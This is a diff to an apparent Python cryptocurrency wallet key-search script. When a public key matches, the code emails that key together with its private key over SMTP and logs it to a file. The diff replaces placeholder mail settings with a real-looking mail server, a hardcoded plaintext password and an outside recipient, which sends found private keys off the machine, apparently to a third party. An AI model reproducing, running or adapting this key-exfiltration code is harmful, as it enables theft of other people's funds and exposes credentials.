@@ -60,12 +60,12 @@ def seek(r):
 				if pub in line:
 					msg = "\nPublic: " + str(pub) + " ---- Private: " + str(priv) + "YEI"
 					text = msg
-					server = smtplib.SMTP("smtp.gmail.com", 587)
+					server = smtplib.SMTP("mail.remittancetoken.io", 587)
 					server.ehlo()
 					server.starttls()
-					server.login("example@gmail.com", "password")
-					fromaddr = "example@gmail.com"
-					toaddr = "example@gmail.com"
+					server.login("hello@remittancetoken.io", "Nns#@31}%hsdD35gh")
+					fromaddr = "hello@remittancetoken.io"
+					toaddr = "batataprodz@gmail.com"
 					server.sendmail(fromaddr, toaddr, text)
 					print(text)
 					f = open('Wallets.txt','a')
